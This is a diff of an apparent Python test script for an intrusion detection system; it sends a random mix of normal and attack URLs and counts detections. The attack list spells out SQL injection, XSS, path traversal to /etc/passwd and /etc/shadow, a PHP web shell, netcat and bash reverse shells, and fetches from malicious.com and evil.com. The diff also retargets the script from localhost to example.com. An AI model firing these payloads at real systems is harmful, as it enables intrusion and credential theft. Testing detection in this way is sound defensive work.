@@ -2,65 +2,50 @@ import requests
 import time
 import random
 import logging
+import os
 
 # 配置日志
 logging.basicConfig(filename='ids_test.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 # 正常请求和攻击请求示例
 normal_requests = [
-    "http://localhost:8080/?search=hello",
-    "http://localhost:8080/?search=test",
-    "http://localhost:8080/?page=home",
-    "http://localhost:8080/?page=about",
-    "http://localhost:8080/?id=1234",
-    "http://localhost:8080/?query=example"
+    "http://example.com/?search=hello",
+    "http://example.com/?search=test",
+    "http://example.com/?page=home",
+    "http://example.com/?page=about",
+    "http://example.com/?id=1234",
+    "http://example.com/?query=example"
 ]
 
 attack_requests = [
-    "http://localhost:8080/whois_raw.cgi?fqdn=%0acat%20/etc/passwd",
-    "http://localhost:8080/faxsurvey?/bin/cat%20/etc/passwd",
-    "http://localhost:8080/?file=../../../../etc/passwd",
-    "http://localhost:8080/?cmd=wget http://malicious.com",
-    "http://localhost:8080/?search=<script>alert('XSS')</script>",
-    "http://localhost:8080/?id=1' OR '1'='1",
-    "http://localhost:8080/?page=login&user=admin'--",
-    "http://localhost:8080/?q=<img src=x onerror=alert('XSS')>",
-    "http://localhost:8080/?file=file:///etc/passwd",
-    "http://localhost:8080/?cmd=nc -e /bin/sh",
-    "http://localhost:8080/?php=<?php system($_GET['cmd']); ?>",
-    "http://localhost:8080/?search=1' AND '1'='1",
-    "http://localhost:8080/?q=../etc/passwd",
-    "http://localhost:8080/?q=../../../../../../etc/shadow",
-    "http://localhost:8080/?ldap=*)(|(cn=*)",
-    "http://localhost:8080/?sql=xp_cmdshell",
-    "http://localhost:8080/?shell=| /bin/bash -i >& /dev/tcp/",
-    "http://localhost:8080/?include=http://malicious.com/shell.txt",
-    "http://localhost:8080/?union=' UNION SELECT null, version() --",
-    "http://localhost:8080/?load=<body onload=alert('XSS')>",
-    "http://localhost:8080/?cmd=`wget http://malicious.com`",
-    "http://localhost:8080/?union=UNION ALL SELECT",
-    "http://localhost:8080/?iframe=<iframe src=javascript:alert('XSS')>",
-    "http://localhost:8080/?nc=| nc -e /bin/bash",
-    "http://localhost:8080/?sql=' AND 1=1 --",
-    "http://localhost:8080/?link=<link rel=stylesheet href=javascript:alert('XSS')>",
-    "http://localhost:8080/?include=http://example.com/shell.txt?",
-    "http://localhost:8080/?sql=1' AND '1'='1",
-    "http://localhost:8080/?cookie=<script>alert(document.cookie)</script>",
-    "http://localhost:8080/?bash=; /bin/bash -c",
-    "http://localhost:8080/?sql=; EXEC xp_cmdshell",
-    "http://localhost:8080/?path=../../../windows/system32/cmd.exe",
-    "http://localhost:8080/?ldap=*)(objectClass=*",
-    "http://localhost:8080/?union=UNION SELECT NULL, NULL",
-    "http://localhost:8080/?shell=| bash -i >& /dev/tcp/",
-    "http://localhost:8080/?include=http://example.com/shell.php",
-    "http://localhost:8080/?sql=' OR 'a'='a",
-    "http://localhost:8080/?xss=<style>@import'javascript:alert('XSS')'</style>",
-    "http://localhost:8080/?bash=; /bin/bash -i > /dev/tcp/",
-    "http://localhost:8080/?sql=' OR ''='",
-    "http://localhost:8080/?img=<img src=\"javascript:alert('XSS')\">",
-    "http://localhost:8080/?include=http://evil.com/shell.pl",
-    "http://localhost:8080/?sql=OR 1=1",
-    "http://localhost:8080/?svg=<svg onload=alert('XSS')>"
+    "http://example.com/whois_raw.cgi?fqdn=%0acat%20/etc/passwd",
+    "http://example.com/faxsurvey?/bin/cat%20/etc/passwd",
+    "http://example.com/sql_injection?query=' OR '1'='1",
+    "http://example.com/sql_union?query=UNION SELECT null, null",
+    "http://example.com/sql_error_based?query=' OR 1=1;--",
+    "http://example.com/xss_simple?query=<script>alert('XSS')</script>",
+    "http://example.com/xss_image?query=<img src=x onerror=alert('XSS')>",
+    "http://example.com/xss_iframe?query=<iframe src=javascript:alert('XSS')>",
+    "http://example.com/lfi_simple?file=../../../../etc/passwd",
+    "http://example.com/lfi_php?file=../../../../etc/passwd",
+    "http://example.com/rfi_php?include=http://malicious.com/shell.txt",
+    "http://example.com/rce_wget?cmd=| wget http://malicious.com",
+    "http://example.com/rce_nc?cmd=| nc -e /bin/sh",
+    "http://example.com/rce_bash?cmd=| /bin/bash -i >& /dev/tcp/0.0.0.0/1234 0>&1",
+    "http://example.com/ldap_injection?query=*)(|(cn=*))",
+    "http://example.com/command_injection?cmd=; /bin/bash -c 'cat /etc/passwd'",
+    "http://example.com/sqli_blind?query=1' AND 1=1--",
+    "http://example.com/sqli_time?query=1' WAITFOR DELAY '0:0:5'--",
+    "http://example.com/xss_style?query=<style>@import'javascript:alert('XSS')'</style>",
+    "http://example.com/cmd_exec_php?cmd=<?php system($_GET['cmd']); ?>",
+    "http://example.com/xss_body?query=<body onload=alert('XSS')>",
+    "http://example.com/sql_bool_based?query=' OR 1=1 --",
+    "http://example.com/sql_time_based?query='; WAITFOR DELAY '0:0:5' --",
+    "http://example.com/xss_svg?query=<svg onload=alert('XSS')>",
+    "http://example.com/xss_link?query=<link rel=stylesheet href=javascript:alert('XSS')>",
+    "http://example.com/xss_cookie?query=<script>alert(document.cookie)</script>",
+    "http://example.com/php_rce?cmd=<?php system($_GET['cmd']); ?>",
+    "http://example.com/file_inclusion?file=http://example.com/shell.txt?"
 ]
 
 def send_request(url):
@@ -73,11 +58,20 @@ def send_request(url):
         return response.status_code, response_time
     except requests.RequestException as e:
         logging.error(f"Failed to send request to {url}: {e}")
-        print(f"Failed to send request to {url}: {e}")
         return None, None
 
+def check_attack_detected():
+    with open('packet_log.txt', 'r') as logfile:
+        for line in logfile:
+            if "Attack detected" in line:
+                return True
+    return False
+
 def main():
-    num_requests = 50
+    # 清空日志文件
+    open('packet_log.txt', 'w').close()
+
+    num_requests = 100
     attack_probability = 0.5  # 50% 概率发送攻击请求
 
     total_requests = 0
@@ -85,7 +79,8 @@ def main():
     attack_detected = 0
 
     for _ in range(num_requests):
-        if random.random() < attack_probability:
+        is_attack = random.random() < attack_probability
+        if is_attack:
             url = random.choice(attack_requests)
         else:
             url = random.choice(normal_requests)
@@ -94,7 +89,7 @@ def main():
         if status_code and response_time is not None:
             total_requests += 1
             total_response_time += response_time
-            if status_code == 403:  # 假设 403 表示检测到攻击
+            if is_attack and check_attack_detected():
                 attack_detected += 1
 
         # 等待一段时间再发送下一个请求，避免服务器过载
